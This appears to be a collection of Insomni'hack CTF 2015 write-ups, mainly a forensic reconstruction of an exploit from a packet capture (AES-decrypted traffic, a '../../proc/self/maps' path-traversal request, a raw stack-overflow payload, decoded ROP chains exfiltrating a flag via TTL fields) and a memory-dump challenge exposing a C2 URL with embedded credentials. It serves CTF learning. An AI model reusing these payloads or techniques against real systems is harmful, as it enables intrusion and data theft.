**Solves:** 5
**Description:** 

(TODO)

## Write-up

(TODO)

## Other write-ups and resources

[http://blog.scrt.ch/2015/03/24/insomnihack-finals-smtpwn-writeup/](http://blog.scrt.ch/2015/03/24/insomnihack-finals-smtpwn-writeup/)
* <http://insomnihack.ch/wp-content/uploads/2016/01/Hacking_like_in_the_movies.pdf># Insomni'hack CTF 2015: SQL Inject Flow

**Category:** Exploit
**Solves:** 2
**Description:** 

> Do you know sql as well as memory corruption ?
> 
> This service is listenning on sqlinjectflow.insomni.hack:3307
> 
> gcc -fno-stack-protector -z execstack -fPIE -pie
> Database cleaned every 10 minutes...
> Author : agix - Difficulty : hard

## Write-up

(TODO)

## Other write-ups and resources

* <http://insomnihack.ch/wp-content/uploads/2016/01/Hacking_like_in_the_movies.pdf># Insomni'hack CTF 2015: the firm(ware)

**Category:** Exploit
**Solves:** 0
**Description:** 

(TODO)

## Write-up

(TODO)

## Other write-ups and resources

* <http://insomnihack.ch/wp-content/uploads/2016/01/Hacking_like_in_the_movies.pdf># Insomni'hack CTF 2015: Elysium Ropchain

**Category:** Forensic
**Solves:** 1
**Description:** 

> This task is a mix between memory exploitation and forensic...
> 
> Most of you exploited the elysium binaries in an elegant way during the Teaser !
> But we want to understand what did the real exploit from the movie.
> Please find the attached pcap and binaries
> 
> WARNING ! The flag format is not respected in this task. Don't worry, it's still a little l33T sentence (I just forgot to put INS{} around it).
> Author : agix - Difficulty : hard

This task has also been proposed in Sthack CTF 2015.

## Write-up

by [0xf4b](https://github.com/0xf4b)

We’re given a `TAR.GZ` archive containing the following files:

```
$ tar tvfz elysium_ropchain_analysis.tar.gz 
drwxr-xr-x agix/agix         0 2015-02-17 17:51 forensic/
-rwxr-xr-x agix/agix   1758972 2014-11-18 14:25 forensic/libc.so.6
-rwxr-xr-x agix/agix     22427 2015-02-17 17:39 forensic/elysium
-rw-rw-r-- agix/agix     26868 2015-02-17 17:51 forensic/elysium_ropchain_analysis.pcap
```

The goal is to study the PCAP file to understand how the elysium binary has been exploited.

### Studying the elysium binary

The elysium binary listens on a port passed as a parameter, and calls the handle_client() function for each new connection.

This function first generates a random number of different kinds of units, then generates 16 random bytes, sends them to the client, winitializes AES cipher and sends a welcome message:

```
.text:00001EBB loc_1EBB:                               ; CODE XREF: handle_client+77
.text:00001EBB                 mov     dword ptr [esp], 0 ; timer
.text:00001EC2                 call    _time
.text:00001EC7                 mov     [esp], eax      ; seed
.text:00001ECA                 call    _srand
.text:00001ECF                 call    generate_units
.text:00001ED4                 mov     dword ptr [esp+4], 10h
.text:00001EDC                 lea     eax, [ebp+buf]
.text:00001EE2                 mov     [esp], eax
.text:00001EE5                 call    _RAND_pseudo_bytes
.text:00001EEA                 mov     dword ptr [esp+0Ch], 0 ; flags
.text:00001EF2                 mov     dword ptr [esp+8], 10h ; n
.text:00001EFA                 lea     eax, [ebp+buf]
.text:00001F00                 mov     [esp+4], eax    ; buf
.text:00001F04                 mov     eax, [ebp+socket_fd]
.text:00001F07                 mov     [esp], eax      ; fd
.text:00001F0A                 call    _send
.text:00001F0F                 lea     eax, [ebp+var_128]
.text:00001F15                 mov     [esp+8], eax
.text:00001F19                 lea     eax, [ebp+aes_info]
.text:00001F1F                 mov     [esp+4], eax
.text:00001F23                 lea     eax, [ebp+buf]
.text:00001F29                 mov     [esp], eax
.text:00001F2C                 call    aes_init
.text:00001F31                 lea     eax, [ebp+aes_info]
.text:00001F37                 mov     [esp+4], eax    ; int
.text:00001F3B                 mov     eax, [ebp+socket_fd]
.text:00001F3E                 mov     [esp], eax      ; fd
.text:00001F41                 call    send_welcome
.text:00001F46                 jmp     loc_2251
```

The AES generation uses the 16 random bytes as an IV, and a fixed key "Elysium_Military": 
```
.text:00001136                 mov     [ebp+key], 'sylE'
.text:0000113D                 mov     [ebp+var_14], '_mui'
.text:00001144                 mov     [ebp+var_10], 'iliM'
.text:0000114B                 mov     [ebp+var_C], 'yrat'
.text:00001152                 mov     eax, [ebp+arg_4]
.text:00001155                 mov     [esp], eax
.text:00001158                 call    _EVP_CIPHER_CTX_init
```

We can then notice that all the communications between the binary and connected clients are ciphered with AES-128-CBC using these parameters. The format of the packets is:

```
| Size 4B | Encrypted data |
```

Therefore, we can start writting a script to decrypt the communications contained in the PCAP file.

### Decryption

Here is the dirty script used for decryption:

```
#!/usr/bin/python

from scapy.all import *
import struct
from Crypto.Cipher import AES

key="Elysium_Military"
datasz=0
a=rdpcap("elysium.pcap")
randbits=""
chunk=""
for pkt in a:
    if pkt.haslayer('Raw'):
        if randbits=="":
            randbits=str(pkt['Raw'])
            aesCiph = AES.new(key, AES.MODE_CBC, randbits)
        else:
            data=str(pkt['Raw'])
            while len(data)>0:
                if datasz == 0:
                    datasz = struct.unpack("<L",data[:4])[0]
                    saved_datasz = datasz
                    data=data[4:]
                if len(data) > 4:
                    chunk += data[:datasz]
                    if len(chunk) == saved_datasz:
                        print "====== FROM",pkt['IP'].src,"======"
                        aesCiph = AES.new(key, AES.MODE_CBC, randbits)
                        chunkok = aesCiph.decrypt(chunk)
                        print chunkok
                        chunk = ""
                        data = data[datasz:]
                        datasz = 0
                    else:
                        datasz = datasz - len(chunk)
                        data = ""
```

The output seems concluding:

```
====== FROM 54.76.18.92 ======
Armadyne robots controller
====== FROM 54.76.18.92 ======
1) Get informations <name>
2) List units
3) Add medical units <count>
4) Add military units <count>
5) Add social units <count>
6) Add spy units <count>
7) Add shields units <count>
8) Add communication units <count>
9) Add transport units <count>
a) Add computer units <count>
*) Exit
====== FROM 192.168.79.67 ======
21ed4c7af50d987589a9029fc0422151be3a0fc2:2
====== FROM 54.76.18.92 ======
Total units : 4658
Medical units : 900
Military units : 220
Social units : 249
Spy units : 91
Shield units : 646
Communication units : 921
Transport units : 807
Computer units : 824
Available units : 3534
====== FROM 54.76.18.92 ======
1) Get informations <name>
2) List units
3) Add medical units <count>
4) Add military units <count>
5) Add social units <count>
6) Add spy units <count>
7) Add shields units <count>
8) Add communication units <count>
9) Add transport units <count>
a) Add computer units <count>
*) Exit
====== FROM 192.168.79.67 ======
ad627891fd066f3a7c9b613b99c5c0f9c473e7f9:1 ../../../../../../../../proc/self/maps
====== FROM 54.76.18.92 ======
b7422000-b7424000 rw-p 00000000 00:00 0 
b7424000-b7427000 r-xp 00000000 ca:01 132831     /lib/i386-linux-gnu/libdl-2.19.so
b7427000-b7428000 r--p 00002000 ca:01 132831     /lib/i386-linux-gnu/libdl-2.19.so
b7428000-b7429000 rw-p 00003000 ca:01 132831     /lib/i386-linux-gnu/libdl-2.19.so
b7429000-b75d2000 r-xp 00000000 ca:01 132822     /lib/i386-linux-gnu/libc-2.19.so
b75d2000-b75d3000 ---p 001a9000 ca:01 132822     /lib/i386-linux-gnu/libc-2.19.so
b75d3000-b75d5000 r--p 001a9000 ca:01 132822     /lib/i386-linux-gnu/libc-2.19.so
b75d5000-b75d6000 rw-p 001ab000 ca:01 132822     /lib/i386-linux-gnu/libc-2.19.so
b75d6000-b75d9000 rw-p 00000000 00:00 0 
b75d9000-b776c000 r-xp 00000000 ca:01 147354     /lib/i386-linux-gnu/libcrypto.so.1.0.0
b776c000-b777b000 r--p 00193000 ca:01 147354     /lib/i386-linux-gnu/libcrypto.so.1.0.0
b777b000-b7782000 rw-p 001a2000 ca:01 147354     /lib/i386-linux-gnu/libcrypto.so.1.0.0
b7782000-b7785000 rw-p 00000000 00:00 0 
b7789000-b778a000 rw-p 00000000 00:00 0 
b778a000-b778f000 rw-p 00000000 00:00 0 
b778f000-b7790000 r-xp 00000000 00:00 0          [vdso]
b7790000-b77b0000 r-xp 00000000 ca:01 132812     /lib/i386-linux-gnu/ld-2.19.so
b77b0000-b77b1000 r--p 0001f000 ca:01 132812     /lib/i386-linux-gnu/ld-2.19.so
b77b1000-b77b2000 rw-p 00020000 ca:01 132812     /lib/i386-linux-gnu/ld-2.19.so
b77b2000-b77b5000 r-xp 00000000 ca:01 395831     /home/esylium/elysium
b77b5000-b77b6000 r--p 00003000 ca:01 395831     /home/esylium/elysium
b77b6000-b77b7000 rw-p 00004000 ca:01 395831     /home/esylium/elysium
b7f1c000-b7f3d000 rw-p 00000000 00:00 0          [heap]
bf83f000-bf860000 rw-p 00000000 00:00 0          [stack]
====== FROM 54.76.18.92 ======
1) Get informations <name>
2) List units
3) Add medical units <count>
4) Add military units <count>
5) Add social units <count>
6) Add spy units <count>
7) Add shields units <count>
8) Add communication units <count>
9) Add transport units <count>
a) Add computer units <count>
*) Exit
====== FROM 192.168.79.67 ======
00f93c8d7327a2f19ec277ed4493e44f94b1110c:3 -900
====== FROM 54.76.18.92 ======
Medical units added
====== FROM 54.76.18.92 ======
1) Get informations <name>
2) List units
3) Add medical units <count>
4) Add military units <count>
5) Add social units <count>
6) Add spy units <count>
7) Add shields units <count>
8) Add communication units <count>
9) Add transport units <count>
a) Add computer units <count>
*) Exit
====== FROM 192.168.79.67 ======
3848db24cfcb2d1e9ba1f551a77bf385da5418a1:4 -204
====== FROM 54.76.18.92 ======
Military units added
====== FROM 54.76.18.92 ======
1) Get informations <name>
2) List units
3) Add medical units <count>
4) Add military units <count>
5) Add social units <count>
6) Add spy units <count>
7) Add shields units <count>
8) Add communication units <count>
9) Add transport units <count>
a) Add computer units <count>
*) Exit
====== FROM 192.168.79.67 ======
cfe9e2f47c968aebefc9318128cc581d29d2b044:5 -249
====== FROM 54.76.18.92 ======
Social units added
====== FROM 54.76.18.92 ======
1) Get informations <name>
2) List units
3) Add medical units <count>
4) Add military units <count>
5) Add social units <count>
6) Add spy units <count>
7) Add shields units <count>
8) Add communication units <count>
9) Add transport units <count>
a) Add computer units <count>
*) Exit
====== FROM 192.168.79.67 ======
a8bfb3e65077e83aeafc5c3da6a1f5dfee4edbc9:6 -75
====== FROM 54.76.18.92 ======
Spy units added
====== FROM 54.76.18.92 ======
1) Get informations <name>
2) List units
3) Add medical units <count>
4) Add military units <count>
5) Add social units <count>
6) Add spy units <count>
7) Add shields units <count>
8) Add communication units <count>
9) Add transport units <count>
a) Add computer units <count>
*) Exit
====== FROM 192.168.79.67 ======
9129a95677dd38e1fe4c03f51c9e5e35485d0c6b:7 -646
====== FROM 54.76.18.92 ======
Shield units added
====== FROM 54.76.18.92 ======
1) Get informations <name>
2) List units
3) Add medical units <count>
4) Add military units <count>
5) Add social units <count>
6) Add spy units <count>
7) Add shields units <count>
8) Add communication units <count>
9) Add transport units <count>
a) Add computer units <count>
*) Exit
====== FROM 192.168.79.67 ======
8da7fda503ec0d9a406601af56bbd4880567658d:8 -905
====== FROM 54.76.18.92 ======
Communication units addedTransport units added
====== FROM 54.76.18.92 ======
1) Get informations <name>
2) List units
3) Add medical units <count>
4) Add military units <count>
5) Add social units <count>
6) Add spy units <count>
7) Add shields units <count>
8) Add communication units <count>
9) Add transport units <count>
a) Add computer units <count>
*) Exit
====== FROM 192.168.79.67 ======
dc166ae1e47988d1113e788891329d3ce205c5e2:9 -807
====== FROM 54.76.18.92 ======
Transport units added
====== FROM 54.76.18.92 ======
1) Get informations <name>
2) List units
3) Add medical units <count>
4) Add military units <count>
5) Add social units <count>
6) Add spy units <count>
7) Add shields units <count>
8) Add communication units <count>
9) Add transport units <count>
a) Add computer units <count>
*) Exit
====== FROM 192.168.79.67 ======
736f3551379c27d05df59d85738b54bbf06b6387:a -808
====== FROM 54.76.18.92 ======
Computer units added
====== FROM 54.76.18.92 ======
1) Get informations <name>
2) List units
3) Add medical units <count>
4) Add military units <count>
5) Add social units <count>
6) Add spy units <count>
7) Add shields units <count>
8) Add communication units <count>
9) Add transport units <count>
a) Add computer units <count>
*) Exit
====== FROM 192.168.79.67 ======
7eba53cc457d0025af33e998dd5e642016c7f41f_3Aba
8Ab9Ac0Ac1Ac2Ac3aaaa
[...]
```

### Traffic study

Let's explain a bit the traffic: when data is received by the binary, it is splitted according to a ':' character using sscanf():
```
.text:000017D1                 mov     eax, [ebp+cmd]
.text:000017D4                 mov     [esp+0Ch], eax
.text:000017D8                 lea     eax, [ebp+sha1_recvd]
.text:000017DB                 mov     [esp+8], eax
.text:000017DF                 lea     eax, (asc_27DE - 4000h)[ebx] ; "%[^:]:%[^\n]"
.text:000017E5                 mov     [esp+4], eax    ; format
.text:000017E9                 mov     eax, [ebp+s]
.text:000017EC                 mov     [esp], eax      ; s
.text:000017EF                 call    _sscanf
```

First part is a SHA1 hash, which should correspond to the SHA1 of the second part, which is a command number. There is also an obvious buffer overflow allowing to overwrite past a stack buffer (#VULN1).

Looking at the decrypted traffic, we first notice the exploitation of a second vulnerability (VULN#2) in the "Get Informations" command handler (number 1). This is a path traversal vulnerability, allowing the attacker to retrieve "/proc/self/maps" file to defeat ASLR by knowing where the binary and the libraries are mapped in memory.
```
====== FROM 192.168.79.67 ======
ad627891fd066f3a7c9b613b99c5c0f9c473e7f9:1 ../../../../../../../../proc/self/maps
====== FROM 54.76.18.92 ======
b7422000-b7424000 rw-p 00000000 00:00 0 
b7424000-b7427000 r-xp 00000000 ca:01 132831     /lib/i386-linux-gnu/libdl-2.19.so
b7427000-b7428000 r--p 00002000 ca:01 132831     /lib/i386-linux-gnu/libdl-2.19.so
b7428000-b7429000 rw-p 00003000 ca:01 132831     /lib/i386-linux-gnu/libdl-2.19.so
b7429000-b75d2000 r-xp 00000000 ca:01 132822     /lib/i386-linux-gnu/libc-2.19.so
b75d2000-b75d3000 ---p 001a9000 ca:01 132822     /lib/i386-linux-gnu/libc-2.19.so
b75d3000-b75d5000 r--p 001a9000 ca:01 132822     /lib/i386-linux-gnu/libc-2.19.so
b75d5000-b75d6000 rw-p 001ab000 ca:01 132822     /lib/i386-linux-gnu/libc-2.19.so
b75d6000-b75d9000 rw-p 00000000 00:00 0 
b75d9000-b776c000 r-xp 00000000 ca:01 147354     /lib/i386-linux-gnu/libcrypto.so.1.0.0
b776c000-b777b000 r--p 00193000 ca:01 147354     /lib/i386-linux-gnu/libcrypto.so.1.0.0
b777b000-b7782000 rw-p 001a2000 ca:01 147354     /lib/i386-linux-gnu/libcrypto.so.1.0.0
b7782000-b7785000 rw-p 00000000 00:00 0 
b7789000-b778a000 rw-p 00000000 00:00 0 
b778a000-b778f000 rw-p 00000000 00:00 0 
b778f000-b7790000 r-xp 00000000 00:00 0          [vdso]
b7790000-b77b0000 r-xp 00000000 ca:01 132812     /lib/i386-linux-gnu/ld-2.19.so
b77b0000-b77b1000 r--p 0001f000 ca:01 132812     /lib/i386-linux-gnu/ld-2.19.so
b77b1000-b77b2000 rw-p 00020000 ca:01 132812     /lib/i386-linux-gnu/ld-2.19.so
b77b2000-b77b5000 r-xp 00000000 ca:01 395831     /home/esylium/elysium
b77b5000-b77b6000 r--p 00003000 ca:01 395831     /home/esylium/elysium
b77b6000-b77b7000 rw-p 00004000 ca:01 395831     /home/esylium/elysium
b7f1c000-b7f3d000 rw-p 00000000 00:00 0          [heap]
bf83f000-bf860000 rw-p 00000000 00:00 0          [stack]
```

We then observe several commands to change the amount of various units types. It seems that another vulnerability is exploited here: it is possible to pass negative integers, and thus decrease the amount of units (VULN#3).
The amount of units are stored in an array of integers starting at 0x00004100 (symbol units).
At the beginning, we notice the following memory configuration:
```
.data:00004100 units           dd 900
.data:00004104 dword_4104      dd 220
.data:00004108 dword_4108      dd 249
.data:0000410C dword_410C      dd 91
.data:00004110 dword_4110      dd 646
.data:00004114 dword_4114      dd 921
.data:00004118 dword_4118      dd 807
.data:0000411C dword_411C      dd 824
```

After the various decreases, we have:
```
.data:00004100 units           dd 0
.data:00004104 dword_4104      dd 16
.data:00004108 dword_4108      dd 0
.data:0000410C dword_410C      dd 16
.data:00004110 dword_4110      dd 0
.data:00004114 dword_4114      dd 16
.data:00004118 dword_4118      dd 0
.data:0000411C dword_411C      dd 16
```

We don't know yet why the attacker need this particular layout.

The last command sent by the attacker tries to exploit the buffer overflow identified earlier (VULN#1). The overflow is triggered by the sscanf call, which will copy an arbitrary amount of bytes to the stack location which should contain the SHA1 part. However, there are two heap pointers located just after the SHA1 buffer, and they are freed before the function returns, which mean that the attacker will have to make these pointers valid, or a crash will occur.

Here is the data sent by the attacker:
```
7eba53cc457d0025af33e998dd5e642016c7f41f_3Aba\x08a{\xb7\x10a{\xb78Ab9Ac0Ac1Ac2Ac3aaaa\xda5W\xb7c5Ac0a{\xb7Ac8AQ\x90Q\xb7`cbadcba\x88GV\xb7(7Q\xb7Q\x90Q\xb7@bbadcba\x88GV\xb7\x99UT\xb7Q\x90Q\xb7 d{\xb7#d{\xb7\x88GV\xb7\xa1SQ\xb7agixscrtoseffuuu\xdd\xcb\\\xb7 d{\xb7
```

The stack layout of the cipher_recv function after the overflow is:
```
sha1_recvd= byte ptr -45h	=> SHA1 + "_"
buf= byte ptr -1Ch		=> 0x61624133
ptr1= dword ptr -18h		=> 0xb77b6108
ptr2= dword ptr -14h		=> 0xb77b6110
var_10= dword ptr -10h		=> 0x39624138
cmd= dword ptr -0Ch		=> 0x41306341
???				=> 0x63413163
???				=> 0x33634132
SAVED_EBP			=> 0x61616161
SAVED_EIP			=> 0xb75735da
```

We can see that the two heap pointers have a valid address. According to the /proc/self/maps file leaked earlier, we see that these addresses respectively point to units+0x8 and units+0x10. We now understand the meaning of the decreases: the attacker built a fake heap with 4 8-bytes chunks, so that the calls to free() do not make the program crash.

Now, it's time to study the ROP chain ...

### ROP Chain

The libc.so.6 and the elysium binary being provided, we can resolve each address of the ROP chain. Once an address has been resolved, it is added to a dictionary, and a Python script shows us a "pretty" rop chain:
```
#!/usr/bin/python

import struct

resolved = {
    0xb75735da: "pop esi ; pop edi ; pop ebp ; ret",
    0xb7519051: "pop ecx ; pop eax; ret",
    0xb7564788: "sub eax,ecx ; ret",
    0xb7513728: "xchg ebx,eax ; ret",
    0xb7545599: "mov edx,eax ; mov eax,edx ; ret",
    0xb75153a1: "int 0x80 ; pop ebp ; pop edi ; pop esi ; pop ebx ; ret",
    0xb75ccbdd: "pop esp ; ret",
}

rop_chain = "da3557b76335416330617bb741633841519051b76063626164636261884756b7283751b7519051b74062626164636261884756b7995554b7519051b720647bb723647bb7884756b7a15351b761676978736372746f73656666757575ddcb5cb720647bb7".decode("hex")

while len(rop_chain)>4:
    value = struct.unpack("<L",rop_chain[:4])[0]
    comment = ""
    if value in resolved:
        comment = resolved[value]
    print hex(value) + "\t" + comment
    rop_chain = rop_chain[4:]
```

The output is (comments have been added for better comprehension):
```
$ python elrop.py
0xb75735da	pop esi ; pop edi ; pop ebp ; ret
0x63413563	
0xb77b6130	
0x41386341	
0xb7519051	pop ecx ; pop eax; ret
0x61626360	
0x61626364	
0xb7564788	sub eax,ecx ; ret			# EAX = 4
0xb7513728	xchg ebx,eax ; ret			# EBX = 4
0xb7519051	pop ecx ; pop eax; ret
0x61626240	
0x61626364	
0xb7564788	sub eax,ecx ; ret			# EAX = 0x124
0xb7545599	mov edx,eax ; mov eax,edx ; ret		# EDX = 0x124
0xb7519051	pop ecx ; pop eax; ret
0xb77b6420	
0xb77b6423	
0xb7564788	sub eax,ecx ; ret			# EAX = 0x3 ; ECX = 0xb77b6420
0xb75153a1	int 0x80 ; pop ; pop ; pop ; pop ; ret	# SYSCALL => read(4, 0xb77b6420, 0x124)
0x78696761	
0x74726373	
0x6665736f	
0x75757566	
0xb75ccbdd	pop esp ; ret				# ESP = 0xb77b6420
0xb77b6420
```

This ROP chain reads 0x124 bytes on the socket and stores them @0xb77b6420. Then the stack is shifted to point to 0xb77b6420. We thus understand that a second ROP chain has been sent to the server.

We can retrieve these 0x124 bytes and repeat the decoding operation:
```
$ python elrop.py
0xb74a7b90	memfrob()
0xb7519051	pop ecx ; pop eax; ret
0xb77b6430	
0x114	
0x9d7b22aa	
0x9d6c08dd	
0x391d2a2a	
0x2a2a0a2a	
[...]
```

It seems we only have 4 valid gadgets, and then garbage. However, there is a call to memfrob, with parameters 0xb77b6430 and 0x114. 0xb77b6430 is the beginning of the second ROP chain plus 0x10, and 0x114 is the size minus 0x10. memfrob(void *ptr, size_t n) is a fonction to XOR each byte of a memory range with 42! We thus have to apply the same decoding to the rest of our ROP chain:
```
0xb74a7b90	memfrob()
0xb7519051	pop ecx ; pop eax; ret
0xb77b6430	
0x114	
0xb7510880	mmap()					# mmap @ 0x13370000, size 0x2000
0xb74622f7	add esp,0x1c ; ret
0x13370000	
0x2000	
0x3	
0x31	
0x0	
0x0	
0x78696761	
0xb7516bb0	recv()					# recv(4, 0x13370000, 0x1e)
0xb74622f7	add esp,0x1c ; ret
0x4	
0x13370000	
0x1e	
0x0	
0x78696761	
0x78696761	
0x78696761	
0xb74a7b90	memfrob()				# memfrob(0x13370000, 0x1e)
0xb7519051	pop ecx ; pop eax; ret
0x13370000	
0x1e	
0xb7504020	open()					# open(0x13370018, 0, 0)
0xb75735da	pop esi ; pop edi ; pop ebp ; ret
0x13370018	
0x0	
0x0	
0xb75044b0	read()					# read(0, 0x13370100, 0x20)
0xb75735da	pop esi ; pop edi ; pop ebp ; ret
0x0	
0x13370100	
0x20	
0xb7504db0	close()					# close(0)
0xb7519051	pop ecx ; pop eax; ret
0x0	
0x78696761	
0xb74ded90	sleep()					# sleep(1)
0xb7519051	pop ecx ; pop eax; ret
0x1	
0x78696761	
0xb753da40	cbc_crypt()				# cbc_crypt(0x13370000, 0x13370100, 0x20, 0x2, 0x13370008)
0xb74622f7	add esp,0x1c ; ret
0x13370000	
0x13370100	
0x20	
0x2	
0x13370008	
0x78696761	
0x78696761	
0xb7516bb0	recv()					# recv(0x4, 0x13371000, 0xaf8)
0xb74622f7	add esp,0x1c ; ret
0x4	
0x13371000	
0xaf8	
0x0	
0x78696761	
0x78696761	
0x78696761	
0xb753da40	cbc_crypt()				# cbc_crypt(0x13370000, 0x13371000, 0xaf8, 0x3, 0x13370010)
0xb74622f7	add esp,0x1c ; ret
0x13370000	
0x13371000	
0xaf8	
0x3	
0x13370010	
0x78696761	
0x78696761	
0xb75ccbdd	pop esp ; ret
0x13371000	
```

This second ROP chain does many interesting things:
- reserves 0x2000 bytes of memory @0x13370000
- reads 0x1e bytes on the socket, and XOR them via memfrob()
- opens and reads 0x20 bytes of a file @0x13370100
- ciphers this content using cbc_crypt() using DES with key @0x13370000 and IV @0x13370008
- reads 0xaf8 bytes on the socket @0x13371000
- deciphers this content using cbc_crypt() using DES with key @0x13370000 and IV @0x13370010
- shifts the stack to @0x13371000

We understand that the next 0x1e bytes sent to the socket, when XORed with 42, should follow the following structure:
```
struct info {
	unsigned char key[8];
	unsigned char IV1[8];
	unsigned char IV2[8];
	char filename[6];
}
```

Lets decode these bytes:
```
>>> ''.join(chr(ord(k)^42) for k in data)
'&4\x08,\x08\x0e\x08\x1c\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00/flag\x00'

struct info {
	unsigned char key[8] = "&4\x08,\x08\x0e\x08\x1c";
	unsigned char IV1[8] = "\0\0\0\0\0\0\0\0";
	unsigned char IV2[8] = "\0\0\0\0\0\0\0\0";
	char filename[6] = "/flag";
}
```

Bingo! We're close. We know that the "/flag" file content (32 bytes) has been written to 0x13370100, and DES ciphered.

It's now time to study the third (and hopefully last) ROP chain :)
For this, we need a small script to use DES_CBC on the 0xaf8 bytes sent:
```

#!/usr/bin/python

from Crypto.Cipher import DES

key ="\x26\x34\x08\x2c\x08\x0e\x08\x1c"
mydes = DES.new(key, DES.MODE_CBC, '\0'*8)
open("ropchain3","wb").write(mydes.decrypt(open("ciphered_bytes","rb").read()))

```

Once we have the cleartext ROP chain, we can analyze it:
```
0xb7516eb0      setsockopt()
0xb74622f7      add esp,0x1c ; ret
0x4     
0x0     
0x2     
0x13370100      
0x1     
0x78696761      
0x78696761      
0xb7516d30      send()
0xb74622f7      add esp,0x1c ; ret
0x4     
0xb77b2000      
0x100   
0x0     
0x78696761      
0x78696761      
0x78696761      
0xb74ded90      sleep()
0xb7519051      pop ecx ; pop eax; ret
0x1     
0x78696761      
0xb7516eb0      setsockopt()
0xb74622f7      add esp,0x1c ; ret
0x4     
0x0     
0x2     
0x13370101      
0x1     
0x78696761      
0x78696761      
0xb7516d30      send()
0xb74622f7      add esp,0x1c ; ret
0x4     
0xb77b213b      
0xc5    
0x0     
0x78696761      
0x78696761      
0x78696761      
0xb74ded90      sleep()
0xb7519051      pop ecx ; pop eax; ret
0x1     
0x78696761      
0xb7516eb0      setsockopt()
0xb74622f7      add esp,0x1c ; ret
0x4     
0x0     
0x2     
0x13370102      
0x1     
0x78696761      
0x78696761      
0xb7516d30      send()
0xb74622f7      add esp,0x1c ; ret
0x4     
0xb77b21a5      
0xd7    
0x0     
0x78696761      
0x78696761      
0x78696761      
0xb74ded90      sleep()
[...]
```
The chain is quite big, but we can clearly identify a pattern which is repeated for each byte of the ciphered flag:
- setsockopt(4, 0, 2, flag_ciphered[i], 1)
- send(4, arbitrary_elf_address, arbitrary_size)

The Flag is sent ciphered, byte by byte, in the TTL field of the IP segment of TCP packets containing arbitrary content from the beginning of the program in memory (we can see the ELF header etc. in wireshark).

All we have to do, one may think, is retrieving these bytes and applying the decipher!
```
#!/usr/bin/python

from Crypto.Cipher import DES

key ="\x26\x34\x08\x2c\x08\x0e\x08\x1c"
flag = "\xef\x9f\x77\xe2\xc9\x7c\xe9\xab\x47\xe6\x7f\x5a\x4d\x50\x18\xa6\x27\xb4\x83\x3e\x2e\xcc\xb1\x12\x8e\x12\xe9\x77\xad\x63\xc0\x87"
mydes = DES.new(key, DES.MODE_CBC, '\0'*8)
print mydes.decrypt(flag)


$ python cbc.py
�MO�
    S3J��%e��3�L+�}�8�C��oN>�

```

Humm ... This does not look like a flag ...

After many frustrations, I thought that the TTL field should have been decreased in transit if the capture has been done on the attacker's machine! We just have to try increasing each byte of the ciphered flag, until we find a flag:
```
#!/usr/bin/python

from Crypto.Cipher import DES
import string

key ="\x26\x34\x08\x2c\x08\x0e\x08\x1c"
flag = "\xef\x9f\x77\xe2\xc9\x7c\xe9\xab\x47\xe6\x7f\x5a\x4d\x50\x18\xa6\x27\xb4\x83\x3e\x2e\xcc\xb1\x12\x8e\x12\xe9\x77\xad\x63\xc0\x87"

for x in xrange(256):
    zout=''.join( chr((ord(k)+x)&0xff) for k in flag )

    mydes = DES.new(key, DES.MODE_CBC, '\0'*8)
    clear = mydes.decrypt(zout)
    if all(ord(c) < 127 and c in string.printable for c in clear.strip("\x00")):
        print x,clear
```

And magic happens:
```
$ python cbc.py
10 In_D0ubt_reb0ot
```

## Other write-ups and resources

* <http://insomnihack.ch/wp-content/uploads/2016/01/Hacking_like_in_the_movies.pdf>
# Insomni'hack CTF 2015: Lost In Memories

**Category:** Forensic
**Solves:** 26
**Description:** 

> You can download a memory image from an compromise host.
> In this challenge, you have to find the flag which is composed of 2 parts:
> - One part is available in the memory image.
> - Another part is available in another host (maybe a CnC...).
> 
> Image available from: Download Image
> Author : Benoit - Difficulty : easy

## Write-Up

by [cryptax](https://github.com/cryptax)

This one provides a memory image
(WIN-DEA2KM5I93L-20150318-151408_e93e1b0d01e0b5c4d5985254e94b958e.7z, 303MB)
and tells us the flag is composed of 2 parts, one in the memory image, and
another one available on another host "maybe a CnC".

We unzip the file and get a 1.5GB of raw data according to 'file'. However,
the data is full of strings. As CTF flags follow the format INS{xxxxx} and
we know the flag is cut in 2 parts, we grep the data for 'INS{'. We are
unlucky. Then, the text mentions a remote server, so we grep for interesting
URLs on the local network (Insomni'hack is an 'offline' CTF - only those
physically present can play). The local network starts by 10.x.x.x:

	$  strings WIN-DEA2KM5I93L-20150318-151408.raw | grep http://10
           http://10.13.37.117/oyekv5ty9tQj/


When we try to visit this URL, the server complains we haven't provided
username/password credentials. So, this looks like the right URL, but we
need to search a bit better.
We are going to look for potential username or password located close to the
URL string:

    $  strings WIN-DEA2KM5I93L-20150318-151408.raw | grep -C 5 http://10


And this time, we are lucky to spot:

    http://johntheslayer:H!66q5p6F$8z8Z*D8gkB@10.13.37.117/oyekv5ty9tQj711.73.31.01.


This corresponds to the syntax http://username:password@server. There are
some additional garbage characters after oyekv5ty9tQj/ . We won't care for
those.
We cannot directly request such a URL though because characters such as ! or
$ need to be encoded (reciprocally %21 and %24). We visit the URL which
provides a link to a file named flag.txt. Let's open that! It says:

	 # Well done, you find the first part of the flag
	 INS{memory_dump_provided_by


Right, so that's why our first search for INS{ did not succeed: the first
part of the flag was provided on the CnC and the second part of the flag is
in the raw image. So, we should rather search for something that ends with
xxx}. We notice that the first part of the flag has several lowercase words
separated by underscores, so we search for _xxx} where xxx are lowercase
characters or digits.

	   $ strings WIN-DEA2KM5I93L-20150318-151408.raw | grep -E '_[a-z0-9]*}' | more
	   ...
	   The second part of the flag is: _by_CSI_drama_series}


Note we are lucky, because acually the flag contained some uppercase
characters so my reasoning was wrong, but the grep worked nonetheless ;)

Finally, the flag is

       INS{memory_dump_provided_by_by_CSI_drama_series}

Oh no! That doesn't work! So we try

       INS{memory_dump_provided_by_CSI_drama_series}

and that works :)

## Other write-ups and resources

The image is splitted in blocks of 100M because of github limitations.
The resulting image is WIN-DEA2KM5I93L-20150318-151408_e93e1b0d01e0b5c4d5985254e94b958e.7z with sha256

f39aff9d45911160c2ca9b8b2394ac62324b288752de264619cf3c9aeb8516e7

* <http://insomnihack.ch/wp-content/uploads/2016/01/Hacking_like_in_the_movies.pdf>
[French](http://snipefoo.blogspot.fr/2015/03/insomnihack-2015.html?m=1)# Insomni'hack CTF 2015: Zoom In

**Category:** Forensic
**Solves:** 43
**Description:**

> Corneal imaging... Horatio sees the flag, thumbs up for him !
> Author : SaD - Difficulty : easy

## Write-up

by [fbonzon](https://github.com/fbonzon)

We are given this image:

<img src="zoomIn_3a3f6e35934021eca75b0abde70333a6.jpg" width="512" />

